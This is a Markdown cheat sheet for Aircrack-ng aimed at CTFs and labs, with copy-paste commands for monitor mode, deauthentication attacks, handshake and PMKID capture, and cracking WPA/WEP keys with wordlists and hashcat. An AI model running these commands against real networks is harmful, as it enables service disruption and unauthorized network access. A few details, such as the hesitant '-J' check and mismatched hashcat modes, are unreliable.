# Aircrack‑ng Cheat Sheet — quick, CTF & lab‑focused reference

**Purpose:** Practical cheat sheet for using the Aircrack‑ng suite to discover, capture, and crack Wi‑Fi authentication (WEP/WPA/WPA2). Focused on common commands, workflows, examples, flags, and tips for CTFs and labs.

---

## What is Aircrack‑ng?
Aircrack‑ng is a suite of tools for auditing wireless networks. It includes tools for monitoring, attacking, testing, and cracking Wi‑Fi networks (WEP, WPA/WPA2). Major components:
- `airmon-ng` — enable monitor mode on wireless interfaces.
- `airodump-ng` — capture packets and survey wireless networks; collect handshakes.
- `aireplay-ng` — inject frames (deauth, fake auth, ARP replay) to speed up handshake capture or replay attacks.
- `aircrack-ng` — offline cracking tool that cracks WEP keys or WPA/WPA2 PSK from captured handshakes using wordlists.
- `airdecap-ng`, `airmon-ng`, `packetforge-ng`, etc. — utilities for packet manipulation and conversion.

**Note:** Use only on networks you own or have explicit permission to test. Unauthorized Wi‑Fi attacks are illegal.

---

## Installation (Kali / Debian)
```bash
sudo apt update
sudo apt install aircrack-ng
```

Check installed version:
```bash
aircrack-ng --help | head -n 3
```

---

## Preparing your adapter (monitor mode)
1. List wireless interfaces and processes that may interfere:
```bash
sudo airmon-ng
sudo airmon-ng check
sudo airmon-ng check kill    # kill interfering processes (NetworkManager, wpa_supplicant)
```
2. Enable monitor mode (example `wlan0`):
```bash
sudo airmon-ng start wlan0
# or with new naming: ip link set wlan0 down; iw dev wlan0 set type monitor; ip link set wlan0 up
```
Monitor mode interface typically appears as `wlan0mon` or `mon0`.

To stop monitor mode:
```bash
sudo airmon-ng stop wlan0mon
sudo service NetworkManager start   # if you killed it earlier
```

---

## Passive reconnaissance — discover networks & clients
Use `airodump-ng` to scan for APs and clients and capture handshakes.
```bash
sudo airodump-ng wlan0mon
```
Useful options:
- `--band a` / `--band b` / `--band g` / `--band abg` — restrict scan band.
- `--write <fileprefix>` — write capture to files (`.cap`, `.csv`, `.kismet.csv`).
- `--channel <ch>` — focus on a specific channel to capture handshakes more efficiently.

Example: capture on channel 6 and write output:
```bash
sudo airodump-ng --channel 6 --write capture wlan0mon
```
To capture one specific AP and its clients (recommended):
```bash
sudo airodump-ng --bssid <AP_BSSID> --channel <CH> --write handshakes wlan0mon
```

Monitor the airodump-ng output for `WPA handshake:` indicator in the top right — that signals a captured 4‑way handshake.

---

## Active techniques — force handshakes faster
### deauthentication attack (most common)
Send deauth frames to a client to force re-authentication (handshake capture):
```bash
sudo aireplay-ng --deauth 10 -a <AP_BSSID> -c <CLIENT_MAC> wlan0mon
```
- `-a` = AP BSSID, `-c` = client MAC. Omitting `-c` deauths all clients.
- Increase count or run continuously (`--deauth 0` for infinite, Ctrl+C to stop).

### ARP replay (WEP only) — speeds WEP key capture
```bash
sudo aireplay-ng -3 -b <AP_BSSID> -h <YOUR_MAC> wlan0mon
```
This injects ARP packets to generate traffic for WEP IV collection.

### Fake auth (when needed)
```bash
sudo aireplay-ng -1 0 -a <AP_BSSID> -h <YOUR_MAC> wlan0mon
```
Use to associate with AP before further attacks (older APs or when required).

---

## Capturing PMKID (WPA/WPA2) without deauth (modern technique)
Some APs expose PMKID via RSN IE during association; hash can be captured via a single probe using `hcxdumptool` / `hcxpcapngtool` (recommended), but aircrack suite can work with capture files. Example using `hcxdumptool` (not part of aircrack-ng but common):
```bash
# hcxdumptool capture (recommended modern method)
sudo hcxdumptool -i wlan0mon -o pmkid_capture.pcapng --enable_status=1
# extract PMKID to hashlist
hcxpcapngtool -o pmkid_hashes.txt pmkid_capture.pcapng
# crack with hashcat (mode 16800 / 22000 depending on format)
hashcat -m 16800 pmkid_hashes.txt rockyou.txt
```

---

## Cracking WPA/WPA2 PSK with aircrack-ng (wordlist)
After capturing handshake (`handshakes-01.cap` or similar):
```bash
# basic crack with wordlist
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <AP_BSSID> handshakes-01.cap
```
Useful options:
- `-w` — path to wordlist
- `-b` — BSSID to focus on (only try this AP)
- `-l <file>` — write found key to file
- `-e <ESSID>` — specify SSID (optional)

**Tip:** If aircrack-ng reports "No handshakes found" but you saw WPA handshake in airodump, ensure capture contains packets from the targeted AP and that handshake frames are present. Use `aircrack-ng -J`? (or other tools) or open in Wireshark to confirm.

---

## Cracking WEP keys
After capturing enough IVs (use aireplay-ng -3 or wait):
```bash
aircrack-ng -b <AP_BSSID> capture.cap
```
Aircrack-ng will attempt to recover WEP key once IV threshold reached.

---

## Converting/cutting capture files
- Use `tcpdump`/`editcap`/`mergecap`/`airdecap-ng` to manipulate .cap files.
- To extract WPA handshake packets for a particular BSSID/ESSID, use `aircrack-ng` or `tshark`/`wireshark`:
```bash
# extract packets for BSSID (example with tshark)
tshark -r fullcapture.cap -Y "wlan.sa || wlan.da" -w filtered.cap
```
- To convert pcapng to pcap:
```bash
editcap -F libpcap input.pcapng output.pcap
```

---

## Combining with other tools (recommended modern flow)
- `hcxdumptool` + `hcxpcapngtool` for PMKID / modern capture -> `hashcat` for GPU cracking. Much faster than CPU wordlist cracking with aircrack-ng.
- `aircrack-ng` is good for quick lab cracking with CPU wordlists (rockyou) and WEP attacks.

Example: capture via airodump & force handshake, then crack with hashcat (after converting capture to hash format):
```bash
# capture handshake with airodump-ng (write to capture.cap)
# convert pcap to hashcat format using hcxpcapngtool (if pcapng)
hcxpcapngtool -o hash.txt capture.pcapng
# crack with hashcat GPU (mode 22000/2500/16800 depends on format)
hashcat -m 22000 hash.txt rockyou.txt
```

---

## Practical step‑by‑step (WPA handshake capture + crack) — copy/paste for CTFs
1. Put interface in monitor mode:
```bash
sudo airmon-ng start wlan0
# interface -> wlan0mon
```
2. Run targeted capture for AP (open new terminal):
```bash
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 6 --write /tmp/handshake wlan0mon
```
3. In another terminal, deauth a client to force handshake:
```bash
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon
```
4. Watch airodump-ng for "WPA handshake". Once captured, stop capture (Ctrl+C).
5. Crack with wordlist:
```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF /tmp/handshake-01.cap
```

---

## Troubleshooting & common gotchas
- **No handshake found:** ensure capture contains EAPOL packets; check with `aircrack-ng -J` or open in Wireshark. Deauth may need to target a specific client (`-c`). Some clients/do not reconnect on deauth or use PMK caching.
- **AP uses PMF / 802.11w:** deauth may be protected; deauth attacks may fail — try PMKID/other techniques or social engineering. 802.11w complicates deauth-based handshake capture.
- **Too few IVs for WEP:** use ARP replay attack to generate traffic.
- **Driver/adapter limitations:** not all Wi‑Fi adapters support injection/monitor mode. Use compatible chipsets (Atheros, Ralink, Realtek with patched drivers).

---

## Fast reference commands (copy/paste)

```bash
# Show interfaces and interfering processes
sudo airmon-ng

# Kill NetworkManager/wpa_supplicant before monitor mode
sudo airmon-ng check kill

# Start monitor mode
sudo airmon-ng start wlan0

# Capture targeted AP to file
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 6 --write /tmp/handshake wlan0mon

# Deauth client(s)
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Crack WPA handshake with rockyou
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF /tmp/handshake-01.cap

# Stop monitor mode
sudo airmon-ng stop wlan0mon
```
---

## CTF tips & ethics
- In CTFs/labs: increase deauth counts and threads; be aggressive to get handshakes quickly.  
- In real engagements: get explicit authorization; reduce deauths; be transparent.  
- Use `hcxdumptool` + `hashcat` when dealing with WPA/WPA2 in real scenarios for better success rates with GPU cracking.  
- Keep a small set of reliable adapters for testing; document which drivers support injection and monitor mode.

---

## Resources & further reading
- Aircrack‑ng official docs: https://www.aircrack-ng.org/  
- hcxdumptool / hcxpcapngtool for PMKID capture and hash conversion.  
- Hashcat documentation for cracking WPA/WPA2 hashes on GPU.  

---

*End of Aircrack‑ng cheat sheet.*
